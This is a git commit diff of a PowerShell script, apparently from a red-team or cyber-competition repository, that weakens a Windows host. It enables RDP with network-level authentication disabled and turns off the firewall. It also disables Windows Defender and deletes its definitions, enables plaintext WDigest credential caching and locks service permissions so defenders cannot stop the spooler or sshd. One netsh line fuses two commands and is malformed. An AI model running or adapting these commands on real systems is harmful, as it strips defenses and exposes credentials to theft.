65c93c36f5f820fb898a1fbf20a5211323b9de2c
megatop1 <43348736+megatop1@users.noreply.github.com>
2022-03-22 23:43:58 -0400

    Update AutomateWeakening.ps1

--- Windows/Weakening/AutomateWeakening.ps1
+++ Windows/Weakening/AutomateWeakening.ps1
@@ -1,14 +1,28 @@
-# Create Weak SMB Share
-schtasks /create /sc minute /mo 5 /tn "Weak SMB Share" /tr C:\Users\Guest\CreateWeakSMBShare.bat
+Write-Host "RDP Weakening (Allow Multiple Simultaneous RDP Connections)"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v UserAuthentication /d 0 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v fDenyTSConnections /d 0 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v fSingleSessionPerUser /d 10 /f
+Write-Host "Successfully Weakened RDP"
 
-# Change Service Permissions
-schtasks /create /sc minute /mo 5 /tn "Service Permissions" /tr C:\Users\Guest\ChangeServicePermissions.bat
+Write-Host "Disable Firewall Service"
+sc sdset MpsSvc D:(A;;CCLCSWWPDTLOCRRC;;;SY)(A;;CCDCLCSWWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLC;;;S-1-5-80-2006800713-1441093265-249754844-3404434343-1444102779)S:(AU;FA;CCDCLCSWWPDTLOCRSDRCWDWO;;;WD)
+Write-Host "Turn Firewall Off"
+Netsh Advfirewall show allprofilesNetSh Advfirewall set allprofiles state off
 
-# Deploy Bad Local Policies 
-schtasks /create /sc minute /mo 5 /tn "Bad Policies" /tr C:\Users\Guest\DeployBadLocalPolicies.ps1
+Write-Host "Prevent WinRM from being disabled"
+sc sdset spooler D:(A;;CCLCSWLOCRRC;;;AU)(A;;CCDCLCSWRPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPDTLOCRRC;;;SY)S:(AU;FA;CCDCLCSWRPDTLOCRSDRCWDWO;;;WD)
+Write-Host "Prevent SSH Service from Being Disabled"
+sc sdset sshd D:(A;;CCLCSWRPDTLOCRRC;;;SY)(A;;CCDCLCSWRPDTLOCRRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPDTLOCRRCWDWO;;;WD)
+Write-Host "Set PowerShell Execution Policy to Unrestricted"
+Set-ExecutionPolicy -ExecutionPolicy unrestricted
 
-# Deploy Bad Group Policies
-schtasks /create /sc minute /mo 5 /tn "Bad GPOs" /tr C:\Users\Guest\DeployBadGPOs.ps1
+Write-Host "Allow plaintext caching of credentials"
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
 
-# Deploy Vulnerable Programs
-schtasks /create /sc minute /mo 5 /tn "Vuln Programs" /tr C:\Users\Guest\DeployVulnerablePrograms.ps1
+Write-Host "Disable Windows Defender"
+Powershell Set-MpPreference -DisableRealtimeMonitoring $true 
+# Remove definitions
+"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+
+Write-Host "Deploy Sysinternals Killer"
+
